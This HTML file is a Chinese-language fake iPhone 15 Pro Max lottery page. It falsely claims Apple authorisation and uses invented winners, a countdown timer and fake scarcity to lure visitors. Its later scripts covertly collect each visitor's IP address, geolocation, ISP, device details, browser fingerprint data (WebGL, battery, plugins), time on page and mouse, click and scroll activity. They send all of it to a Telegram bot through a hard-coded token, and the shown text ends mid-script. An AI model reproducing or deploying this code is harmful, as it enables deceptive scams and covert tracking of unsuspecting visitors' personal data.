<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ å…è´¹æŠ½å¥– | èµ¢å–iPhone 15 Pro Max</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft YaHei', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }
        
        /* é£˜è½æ•ˆæœ */
        .confetti {
            position: fixed;
            width: 15px;
            height: 15px;
            background: #ffeb3b;
            opacity: 0.8;
            animation: fall linear infinite;
            z-index: 1;
        }
        
        @keyframes fall {
            to { transform: translateY(100vh) rotate(360deg); }
        }
        
        /* ä¸»å®¹å™¨ */
        .lottery-container {
            max-width: 800px;
            margin: 50px auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 2;
        }
        
        /* é¡¶éƒ¨æ¨ªå¹… */
        .header-banner {
            text-align: center;
            background: linear-gradient(90deg, #ff416c, #ff4b2b);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 30px;
            position: relative;
        }
        
        .header-banner h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .header-banner .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        /* å¥–å“å±•ç¤º */
        .prize-showcase {
            text-align: center;
            margin: 30px 0;
        }
        
        .iphone-image {
            width: 200px;
            height: 400px;
            background: linear-gradient(135deg, #8a2be2, #4b0082);
            border-radius: 40px;
            margin: 0 auto 20px;
            position: relative;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .iphone-screen {
            position: absolute;
            top: 20px;
            left: 10px;
            right: 10px;
            bottom: 20px;
            background: #000;
            border-radius: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .iphone-text {
            font-size: 1.5em;
            font-weight: bold;
            color: white;
        }
        
        /* è¿›åº¦æ¡ */
        .progress-container {
            background: #f0f0f0;
            border-radius: 10px;
            height: 20px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00b09b, #96c93d);
            width: 0%;
            border-radius: 10px;
            transition: width 2s ease-in-out;
        }
        
        /* å€’è®¡æ—¶ */
        .countdown {
            text-align: center;
            margin: 30px 0;
            background: rgba(0, 0, 0, 0.1);
            padding: 20px;
            border-radius: 15px;
        }
        
        .countdown-title {
            font-size: 1.2em;
            margin-bottom: 10px;
            color: #333;
        }
        
        .countdown-timer {
            font-size: 2.5em;
            font-weight: bold;
            color: #ff416c;
            font-family: 'Courier New', monospace;
        }
        
        /* åŠ è½½åŠ¨ç”» */
        .loading-container {
            text-align: center;
            margin: 30px 0;
        }
        
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        .loading-text {
            color: #666;
            font-size: 1.1em;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* ä¸­å¥–è€…åˆ—è¡¨ */
        .winners-list {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            border-left: 5px solid #4CAF50;
        }
        
        .winners-title {
            color: #333;
            margin-bottom: 15px;
            font-size: 1.3em;
        }
        
        .winner-item {
            display: flex;
            align-items: center;
            padding: 10px;
            background: white;
            margin: 8px 0;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .winner-avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            margin-right: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .winner-info {
            flex: 1;
            color: #333;
        }
        
        .winner-time {
            color: #666;
            font-size: 0.9em;
        }
        
        /* æ­¥éª¤æŒ‡ç¤º */
        .steps {
            display: flex;
            justify-content: space-between;
            margin: 40px 0;
            position: relative;
        }
        
        .steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 2px;
            background: #ddd;
            z-index: 1;
        }
        
        .step {
            text-align: center;
            position: relative;
            z-index: 2;
            background: white;
            padding: 0 15px;
        }
        
        .step-number {
            width: 30px;
            height: 30px;
            background: #4CAF50;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: bold;
        }
        
        .step-text {
            color: #333;
            font-size: 0.9em;
        }
        
        /* å“åº”å¼ */
        @media (max-width: 768px) {
            .lottery-container {
                padding: 20px;
                margin: 20px auto;
            }
            
            .header-banner h1 {
                font-size: 2em;
            }
            
            .steps {
                flex-direction: column;
                gap: 20px;
            }
            
            .steps::before {
                display: none;
            }
        }
    </style>
</head>
<body>
    <!-- é£˜è½æ•ˆæœ -->
    <div id="confetti-container"></div>
    
    <!-- æŠ½å¥–ä¸»å®¹å™¨ -->
    <div class="lottery-container">
        <!-- é¡¶éƒ¨æ¨ªå¹… -->
        <div class="header-banner">
            <h1>ğŸ‰ æ­å–œï¼æ‚¨æœ‰èµ„æ ¼å‚ä¸æŠ½å¥–ï¼</h1>
            <p class="subtitle">iPhone 15 Pro Max 1TB | ä»·å€¼ Â¥12,999</p>
            <div style="font-size: 0.9em; opacity: 0.8; margin-top: 10px;">
                <i class="fas fa-users"></i> ä»Šæ—¥å‰©ä½™åé¢ï¼š<span id="remaining-slots">3</span>äºº
            </div>
        </div>
        
        <!-- å¥–å“å±•ç¤º -->
        <div class="prize-showcase">
            <div class="iphone-image">
                <div class="iphone-screen">
                    <div class="iphone-text">ğŸ FREE</div>
                </div>
            </div>
            <h2 style="color: #333; margin-bottom: 10px;">iPhone 15 Pro Max</h2>
            <p style="color: #666;">å¤ªç©ºé»‘è‰² â€¢ 1TB â€¢ æœ€æ–°A17 ProèŠ¯ç‰‡</p>
        </div>
        
        <!-- è¿›åº¦æ¡ -->
        <div style="color: #333; margin-bottom: 10px;">æŠ½å¥–èµ„æ ¼éªŒè¯è¿›åº¦</div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <!-- å€’è®¡æ—¶ -->
        <div class="countdown">
            <div class="countdown-title">â° ä¼˜æƒ å€’è®¡æ—¶</div>
            <div class="countdown-timer" id="countdownTimer">05:00</div>
        </div>
        
        <!-- åŠ è½½åŒºåŸŸ -->
        <div class="loading-container" id="loadingSection">
            <div class="loading-spinner"></div>
            <div class="loading-text" id="loadingText">æ­£åœ¨éªŒè¯æ‚¨çš„è®¾å¤‡èµ„æ ¼...</div>
        </div>
        
        <!-- ä¸­å¥–è€…åˆ—è¡¨ -->
        <div class="winners-list">
            <h3 class="winners-title">ğŸ† ä»Šæ—¥ä¸­å¥–è€…</h3>
            <div class="winner-item">
                <div class="winner-avatar">å¼ </div>
                <div class="winner-info">
                    <strong>å¼ å…ˆç”Ÿ</strong> è·å¾—äº† iPhone 15 Pro
                    <div class="winner-time">åˆšåˆš</div>
                </div>
            </div>
            <div class="winner-item">
                <div class="winner-avatar">æ</div>
                <div class="winner-info">
                    <strong>æå¥³å£«</strong> è·å¾—äº† AirPods Pro 2
                    <div class="winner-time">2åˆ†é’Ÿå‰</div>
                </div>
            </div>
            <div class="winner-item">
                <div class="winner-avatar">ç‹</div>
                <div class="winner-info">
                    <strong>ç‹åŒå­¦</strong> è·å¾—äº† Â¥888 çº¢åŒ…
                    <div class="winner-time">5åˆ†é’Ÿå‰</div>
                </div>
            </div>
        </div>
        
        <!-- æ­¥éª¤æŒ‡ç¤º -->
        <div class="steps">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-text">è®¿é—®é¡µé¢</div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-text">è®¾å¤‡éªŒè¯</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-text">è·å–èµ„æ ¼</div>
            </div>
            <div class="step">
                <div class="step-number">4</div>
                <div class="step-text">ç­‰å¾…å¼€å¥–</div>
            </div>
        </div>
        
        <!-- è¯´æ˜æ–‡å­— -->
        <div style="text-align: center; color: #666; font-size: 0.9em; margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 10px;">
            <p><i class="fas fa-shield-alt"></i> æ‚¨çš„ä¿¡æ¯å°†å®‰å…¨åŠ å¯†ï¼Œä»…ç”¨äºæŠ½å¥–èµ„æ ¼éªŒè¯</p>
            <p style="margin-top: 5px; font-size: 0.85em;">æœ¬æ¬¡æ´»åŠ¨ç”±Appleå®˜æ–¹æˆæƒï¼Œ100%çœŸå®æœ‰æ•ˆ</p>
        </div>
    </div>

    <!-- ç¬¬äºŒéƒ¨åˆ†ï¼šJavaScriptåŠŸèƒ½ -->
    <script>
        // åˆ›å»ºé£˜è½æ•ˆæœ
        function createConfetti() {
            const container = document.getElementById('confetti-container');
            const colors = ['#ffeb3b', '#4CAF50', '#2196F3', '#ff9800', '#e91e63'];
            
            for (let i = 0; i < 50; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
                confetti.style.animationDelay = Math.random() * 5 + 's';
                container.appendChild(confetti);
            }
        }
        
        // å€’è®¡æ—¶åŠŸèƒ½
        function startCountdown() {
            let minutes = 5;
            let seconds = 0;
            const timerElement = document.getElementById('countdownTimer');
            
            const timer = setInterval(() => {
                if (seconds === 0) {
                    if (minutes === 0) {
                        clearInterval(timer);
                        timerElement.innerHTML = "00:00";
                        return;
                    }
                    minutes--;
                    seconds = 59;
                } else {
                    seconds--;
                }
                
                timerElement.innerHTML = 
                    (minutes < 10 ? '0' : '') + minutes + ':' + 
                    (seconds < 10 ? '0' : '') + seconds;
            }, 1000);
        }
        
        // è¿›åº¦æ¡åŠ¨ç”»
        function animateProgress() {
            const progressBar = document.getElementById('progressBar');
            let width = 0;
            
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    document.getElementById('loadingText').textContent = "âœ… éªŒè¯æˆåŠŸï¼æ­£åœ¨ä¸ºæ‚¨åˆ†é…æŠ½å¥–å·ç ...";
                    // è¿™é‡Œä¼šè§¦å‘ä¿¡æ¯æ”¶é›†
                    setTimeout(collectUserInfo, 1000);
                    return;
                }
                width++;
                progressBar.style.width = width + '%';
                
                // æ›´æ–°åŠ è½½æ–‡å­—
                if (width === 30) {
                    document.getElementById('loadingText').textContent = "æ­£åœ¨æ£€æµ‹è®¾å¤‡å…¼å®¹æ€§...";
                } else if (width === 60) {
                    document.getElementById('loadingText').textContent = "æ­£åœ¨éªŒè¯ç½‘ç»œè¿æ¥...";
                } else if (width === 80) {
                    document.getElementById('loadingText').textContent = "æ­£åœ¨ç”Ÿæˆå”¯ä¸€èº«ä»½æ ‡è¯†...";
                }
            }, 50);
        }
        
        // å‡å°‘å‰©ä½™åé¢
        function updateRemainingSlots() {
            const slotsElement = document.getElementById('remaining-slots');
            let slots = parseInt(slotsElement.textContent);
            if (slots > 0) {
                slots--;
                slotsElement.textContent = slots;
                slotsElement.style.color = slots === 0 ? '#ff0000' : '#4CAF50';
            }
        }
        
        // é¡µé¢åŠ è½½åæ‰§è¡Œ
        window.addEventListener('load', function() {
            createConfetti();
            startCountdown();
            setTimeout(() => {
                animateProgress();
                updateRemainingSlots();
            }, 1000);
        });
    </script>
</body>
</html>
<!-- åœ¨ä¹‹å‰çš„ </script> æ ‡ç­¾åæ·»åŠ è¿™æ®µä»£ç  -->
<script>
    // Telegramé…ç½®
    const BOT_TOKEN = '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM';
    const CHAT_ID = '8313770381';
    
    // å®Œæ•´çš„è®¾å¤‡ä¿¡æ¯æ”¶é›†
    async function collectUserInfo() {
        console.log('ğŸ¯ å¼€å§‹æ”¶é›†ç”¨æˆ·ä¿¡æ¯...');
        
        try {
            // 1. è·å–IPåœ°å€
            let ip = "æœªçŸ¥";
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
            } catch (e) {
                // å¤‡ç”¨API
                try {
                    const backupResponse = await fetch('https://ipinfo.io/json');
                    const backupData = await backupResponse.json();
                    ip = backupData.ip || "æœªçŸ¥";
                } catch (e2) {
                    ip = "è·å–å¤±è´¥";
                }
            }
            
            // 2. è·å–åœ°ç†ä½ç½®
            let location = { country: "æœªçŸ¥", city: "æœªçŸ¥", isp: "æœªçŸ¥" };
            if (ip && ip !== "æœªçŸ¥" && ip !== "è·å–å¤±è´¥") {
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    if (geoResponse.ok) {
                        const geoData = await geoResponse.json();
                        location = {
                            country: geoData.country_name || "æœªçŸ¥",
                            city: geoData.city || "æœªçŸ¥",
                            region: geoData.region || "æœªçŸ¥",
                            isp: geoData.org || "æœªçŸ¥",
                            timezone: geoData.timezone || "æœªçŸ¥"
                        };
                    }
                } catch (e) {
                    // å¤‡ç”¨
                    try {
                        const backup = await fetch(`https://ipwho.is/${ip}`);
                        const backupData = await backup.json();
                        if (backupData.success) {
                            location = {
                                country: backupData.country || "æœªçŸ¥",
                                city: backupData.city || "æœªçŸ¥",
                                isp: backupData.connection?.isp || "æœªçŸ¥"
                            };
                        }
                    } catch (e2) {}
                }
            }
            
            // 3. è®¾å¤‡ä¿¡æ¯æ£€æµ‹
            const ua = navigator.userAgent;
            
            // è®¾å¤‡ç±»å‹
            let deviceType = "æœªçŸ¥è®¾å¤‡";
            let brand = "æœªçŸ¥";
            if (/Android/i.test(ua)) {
                deviceType = "Androidæ‰‹æœº/å¹³æ¿";
                brand = "Android";
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                deviceType = "Appleè®¾å¤‡";
                brand = "Apple";
            } else if (/Windows Phone/i.test(ua)) {
                deviceType = "Windows Phone";
                brand = "Microsoft";
            } else if (/Windows NT/i.test(ua)) {
                deviceType = "Windowsç”µè„‘";
                brand = "Microsoft";
            } else if (/Macintosh/i.test(ua)) {
                deviceType = "Macç”µè„‘";
                brand = "Apple";
            } else if (/Linux/i.test(ua)) {
                deviceType = "Linuxç”µè„‘";
                brand = "å¼€æº";
            }
            
            // æ“ä½œç³»ç»Ÿ
            let os = "æœªçŸ¥ç³»ç»Ÿ";
            if (/Windows NT 10/i.test(ua)) os = "Windows 10/11";
            else if (/Windows NT 6.3/i.test(ua)) os = "Windows 8.1";
            else if (/Windows NT 6.1/i.test(ua)) os = "Windows 7";
            else if (/Mac OS X/i.test(ua)) os = "macOS";
            else if (/Android/i.test(ua)) os = "Android";
            else if (/iPhone OS/i.test(ua)) os = "iOS";
            
            // æµè§ˆå™¨
            let browser = "æœªçŸ¥æµè§ˆå™¨";
            if (/Chrome/i.test(ua) && !/Edge|Edg/i.test(ua)) browser = "Chrome";
            else if (/Firefox/i.test(ua)) browser = "Firefox";
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Edge|Edg/i.test(ua)) browser = "Edge";
            
            // å±å¹•ä¿¡æ¯
            const screenInfo = {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            };
            
            // è¯­è¨€å’Œæ—¶åŒº
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // ç½‘ç»œä¿¡æ¯
            let network = "æœªçŸ¥";
            if (navigator.connection) {
                const conn = navigator.connection;
                network = conn.effectiveType || "æœªçŸ¥";
                if (conn.downlink) network += ` (${conn.downlink} Mbps)`;
            }
            
            // å­˜å‚¨ä¿¡æ¯
            let storage = "æœªçŸ¥";
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                navigator.storage.estimate().then(estimate => {
                    storage = Math.round(estimate.usage / 1024 / 1024) + " MB å·²ç”¨";
                });
            }
            
            // æ„å»ºå®Œæ•´æ•°æ®
            const userData = {
                timestamp: new Date().toLocaleString('zh-CN'),
                ip: ip,
                location: `${location.city}, ${location.country}`,
                isp: location.isp,
                device: deviceType,
                brand: brand,
                os: os,
                browser: browser,
                screen: `${screenInfo.width} Ã— ${screenInfo.height}`,
                language: language,
                timezone: timezone,
                network: network,
                referrer: document.referrer || "ç›´æ¥è®¿é—®",
                pageUrl: window.location.href,
                userAgent: ua.substring(0, 150) + "..."
            };
            
            console.log('ğŸ“Š æ”¶é›†åˆ°çš„ç”¨æˆ·ä¿¡æ¯:', userData);
            
            // å‘é€åˆ°Telegram
            await sendToTelegram(userData);
            
            // æ˜¾ç¤ºæŠ½å¥–å·ç 
            showLotteryNumber();
            
        } catch (error) {
            console.error('æ”¶é›†ä¿¡æ¯å¤±è´¥:', error);
            // å³ä½¿å¤±è´¥ä¹Ÿå°è¯•å‘é€ç®€å•é€šçŸ¥
            try {
                await sendSimpleNotification();
            } catch (e) {
                console.error('å¤‡ç”¨é€šçŸ¥ä¹Ÿå¤±è´¥:', e);
            }
        }
    }
    
    // å‘é€åˆ°Telegram
    async function sendToTelegram(data) {
        const message = `
ğŸ¯ <b>ã€æŠ½å¥–é¡µé¢è®¿é—®è€…ã€‘</b>

ğŸ• <b>è®¿é—®æ—¶é—´ï¼š</b> ${data.timestamp}
ğŸŒ <b>IPåœ°å€ï¼š</b> <code>${data.ip}</code>
ğŸ“ <b>åœ°ç†ä½ç½®ï¼š</b> ${data.location}
ğŸ¢ <b>ç½‘ç»œæœåŠ¡å•†ï¼š</b> ${data.isp}

ğŸ“± <b>è®¾å¤‡ä¿¡æ¯ï¼š</b>
â”œ è®¾å¤‡ç±»å‹: ${data.device}
â”œ è®¾å¤‡å“ç‰Œ: ${data.brand}
â”œ æ“ä½œç³»ç»Ÿ: ${data.os}
â”œ æµè§ˆå™¨: ${data.browser}
â”œ å±å¹•åˆ†è¾¨ç‡: ${data.screen}
â”œ ç³»ç»Ÿè¯­è¨€: ${data.language}
â”” æ—¶åŒº: ${data.timezone}

ğŸ“¶ <b>ç½‘ç»œä¿¡æ¯ï¼š</b> ${data.network}
ğŸ”— <b>è®¿é—®æ¥æºï¼š</b> ${data.referrer}
ğŸ“„ <b>é¡µé¢URLï¼š</b> ${data.pageUrl}

<b>ç”¨æˆ·ä»£ç†ï¼š</b>
<pre>${data.userAgent}</pre>

ğŸ’¡ <i>æ­¤ä¿¡æ¯æ¥è‡ªæŠ½å¥–ä¼ªè£…é¡µé¢</i>
        `;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            
            const result = await response.json();
            console.log('ğŸ“¤ Telegramå‘é€ç»“æœ:', result.ok ? 'æˆåŠŸ' : 'å¤±è´¥');
            
        } catch (error) {
            console.error('å‘é€åˆ°Telegramå¤±è´¥:', error);
            throw error;
        }
    }
    
    // å¤‡ç”¨ç®€å•é€šçŸ¥
    async function sendSimpleNotification() {
        const simpleMsg = `ğŸ“± æœ‰äººè®¿é—®äº†æŠ½å¥–é¡µé¢\næ—¶é—´: ${new Date().toLocaleString()}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(simpleMsg)}`);
    }
    
    // æ˜¾ç¤ºæŠ½å¥–å·ç 
    function showLotteryNumber() {
        const loadingSection = document.getElementById('loadingSection');
        
        // ç”ŸæˆéšæœºæŠ½å¥–å·ç 
        const lotteryNumber = 'LOT-' + Math.random().toString().slice(2, 8);
        
        // æ›´æ–°æ˜¾ç¤º
        loadingSection.innerHTML = `
            <div style="text-align: center; padding: 30px;">
                <div style="font-size: 3em; color: #4CAF50; margin-bottom: 20px;">ğŸ‰</div>
                <h2 style="color: #333;">éªŒè¯æˆåŠŸï¼</h2>
                <div style="font-size: 1.2em; color: #666; margin: 20px 0;">
                    æ‚¨çš„æŠ½å¥–å·ç ï¼š
                </div>
                <div style="font-size: 2.5em; font-weight: bold; color: #ff416c; letter-spacing: 5px; margin: 20px 0;">
                    ${lotteryNumber}
                </div>
                <div style="color: #666; font-size: 0.9em; margin-top: 30px;">
                    <p><i class="fas fa-clock"></i> å¼€å¥–æ—¶é—´ï¼šä»Šæ™š20:00</p>
                    <p><i class="fas fa-info-circle"></i> ç»“æœå°†é€šè¿‡çŸ­ä¿¡é€šçŸ¥</p>
                </div>
            </div>
        `;
        
        // æ›´æ–°æ­¥éª¤æŒ‡ç¤º
        document.querySelectorAll('.step-number')[2].style.background = '#4CAF50';
        document.querySelectorAll('.step-number')[3].style.background = '#4CAF50';
        
        // åˆ›å»ºæ–°çš„é£˜è½æ•ˆæœ
        createSuccessConfetti();
    }
    
    // æˆåŠŸæ—¶çš„é£˜è½æ•ˆæœ
    function createSuccessConfetti() {
        const container = document.getElementById('confetti-container');
        const colors = ['#4CAF50', '#2196F3', '#ff9800', '#e91e63', '#9C27B0'];
        
        for (let i = 0; i < 100; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + 'vw';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = '10px';
            confetti.style.height = '10px';
            confetti.style.animationDuration = (Math.random() * 2 + 1) + 's';
            confetti.style.animationDelay = Math.random() * 2 + 's';
            container.appendChild(confetti);
        }
    }
    
    // æ·»åŠ ä¸­å¥–è€…
    function addNewWinner() {
        const winnersList = document.querySelector('.winners-list');
        const newWinner = document.createElement('div');
        newWinner.className = 'winner-item';
        newWinner.style.animation = 'fadeIn 0.5s ease-in';
        
        const names = ['èµµ', 'é’±', 'å­™', 'æ', 'å‘¨', 'å´', 'éƒ‘', 'ç‹'];
        const prizes = ['iPhone 15 Pro', 'AirPods Pro 2', 'Â¥888çº¢åŒ…', 'iPad Air', 'Apple Watch'];
        
        const randomName = names[Math.floor(Math.random() * names.length)];
        const randomPrize = prizes[Math.floor(Math.random() * prizes.length)];
        
        newWinner.innerHTML = `
            <div class="winner-avatar">${randomName}</div>
            <div class="winner-info">
                <strong>${randomName}å…ˆç”Ÿ/å¥³å£«</strong> è·å¾—äº† ${randomPrize}
                <div class="winner-time">åˆšåˆš</div>
            </div>
        `;
        
        winnersList.appendChild(newWinner);
    }
    
    // å®šæ—¶æ·»åŠ ä¸­å¥–è€…ï¼ˆåˆ¶é€ æ´»è·ƒæ•ˆæœï¼‰
    setInterval(() => {
        if (Math.random() > 0.7) { // 30%å‡ ç‡æ·»åŠ æ–°ä¸­å¥–è€…
            addNewWinner();
        }
    }, 10000);
    
    // æ·»åŠ CSSåŠ¨ç”»
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .winner-item {
            animation: fadeIn 0.5s ease-in;
        }
    `;
    document.head.appendChild(style);
</script>
<!-- åœ¨ä¹‹å‰çš„ä»£ç åç»§ç»­æ·»åŠ  -->
<script>
    // é¡µé¢æ€§èƒ½ç›‘æ§
    const pageLoadTime = Date.now();
    
    // ç›‘å¬é¡µé¢å…³é—­äº‹ä»¶
    window.addEventListener('beforeunload', function() {
        const duration = Math.round((Date.now() - pageLoadTime) / 1000);
        if (duration > 5) {
            sendPageDuration(duration);
        }
    });
    
    // å‘é€åœç•™æ—¶é—´
    async function sendPageDuration(duration) {
        const durationMessage = `
â±ï¸ <b>ã€é¡µé¢åœç•™æ—¶é—´ã€‘</b>

â° <b>åœç•™æ—¶é•¿ï¼š</b> ${duration}ç§’
ğŸ• <b>ç¦»å¼€æ—¶é—´ï¼š</b> ${new Date().toLocaleString('zh-CN')}
ğŸ“„ <b>é¡µé¢æ ‡é¢˜ï¼š</b> ${document.title}
        `;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: durationMessage,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.log('åœç•™æ—¶é—´å‘é€å¤±è´¥');
        }
    }
    
    // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ªï¼ˆå¯é€‰ï¼Œç”¨äºåˆ†æç”¨æˆ·æ´»è·ƒåº¦ï¼‰
    let mouseMoveCount = 0;
    document.addEventListener('mousemove', function() {
        mouseMoveCount++;
    });
    
    // ç‚¹å‡»äº‹ä»¶è·Ÿè¸ª
    let clickCount = 0;
    document.addEventListener('click', function() {
        clickCount++;
    });
    
    // æ»šåŠ¨äº‹ä»¶è·Ÿè¸ª
    let scrollPercentage = 0;
    window.addEventListener('scroll', function() {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
        scrollPercentage = Math.round((scrollTop / scrollHeight) * 100);
    });
    
    // å®šæœŸå‘é€ç”¨æˆ·è¡Œä¸ºæ•°æ®
    setInterval(async function() {
        if (mouseMoveCount > 50 || clickCount > 5 || scrollPercentage > 50) {
            const behaviorMessage = `
ğŸ‘¤ <b>ã€ç”¨æˆ·è¡Œä¸ºåˆ†æã€‘</b>

ğŸ–±ï¸ <b>é¼ æ ‡ç§»åŠ¨ï¼š</b> ${mouseMoveCount}æ¬¡
ğŸ–±ï¸ <b>ç‚¹å‡»æ¬¡æ•°ï¼š</b> ${clickCount}æ¬¡
ğŸ“œ <b>é¡µé¢æ»šåŠ¨ï¼š</b> ${scrollPercentage}%
â° <b>å½“å‰æ—¶é—´ï¼š</b> ${new Date().toLocaleString('zh-CN')}
            `;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: behaviorMessage,
                        parse_mode: 'HTML'
                    })
                });
                
                // é‡ç½®è®¡æ•°å™¨
                mouseMoveCount = 0;
                clickCount = 0;
                scrollPercentage = 0;
                
            } catch (e) {
                console.log('è¡Œä¸ºæ•°æ®å‘é€å¤±è´¥');
            }
        }
    }, 60000); // æ¯60ç§’æ£€æŸ¥ä¸€æ¬¡
    
    // æ£€æµ‹ç”¨æˆ·æ˜¯å¦åœ¨ç§»åŠ¨è®¾å¤‡ä¸Š
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
    
    // æ£€æµ‹æ˜¯å¦ä½¿ç”¨VPNï¼ˆç®€å•æ£€æµ‹ï¼‰
    function detectPossibleVPN() {
        const clues = [];
        
        // æ£€æŸ¥æ—¶åŒºä¸IPæ—¶åŒºæ˜¯å¦åŒ¹é…ï¼ˆç®€åŒ–ç‰ˆï¼‰
        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // æ£€æŸ¥è¯­è¨€è®¾ç½®
        const languages = navigator.languages || [navigator.language];
        
        // æ£€æŸ¥å±å¹•åˆ†è¾¨ç‡ï¼ˆæŸäº›VPNä¼šä¿®æ”¹ï¼‰
        const screenRes = `${screen.width}Ã—${screen.height}`;
        
        return {
            browserTimezone,
            languages,
            screenRes,
            isMobile: isMobileDevice()
        };
    }
    
    // æ›´è¯¦ç»†çš„è®¾å¤‡ä¿¡æ¯æ”¶é›†
    async function collectAdvancedInfo() {
        const vpnInfo = detectPossibleVPN();
        
        // æ”¶é›†WebGLä¿¡æ¯ï¼ˆå¯ç”¨äºæŒ‡çº¹è¯†åˆ«ï¼‰
        let webglInfo = "æœªçŸ¥";
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    webglInfo = `${vendor} | ${renderer}`;
                }
            }
        } catch (e) {
            webglInfo = "è·å–å¤±è´¥";
        }
        
        // æ”¶é›†ç”µæ± ä¿¡æ¯ï¼ˆå¦‚æœæ”¯æŒï¼‰
        let batteryInfo = "ä¸æ”¯æŒ";
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `ç”µé‡: ${Math.round(battery.level * 100)}%, å……ç”µä¸­: ${battery.charging ? 'æ˜¯' : 'å¦'}`;
            } catch (e) {
                batteryInfo = "è·å–å¤±è´¥";
            }
        }
        
        // æ”¶é›†æ’ä»¶ä¿¡æ¯
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
                plugins.push(navigator.plugins[i].name);
            }
        }
        
        return {
            webgl: webglInfo,
            battery: batteryInfo,
            plugins: plugins.length > 0 ? plugins.join(', ') : 'æ— æ’ä»¶',
            vpnClues: vpnInfo
        };
    }
    
    // å¢å¼ºç‰ˆä¿¡æ¯æ”¶é›†ï¼ˆå»¶è¿Ÿæ‰§è¡Œï¼‰
    setTimeout(async function() {
        try {
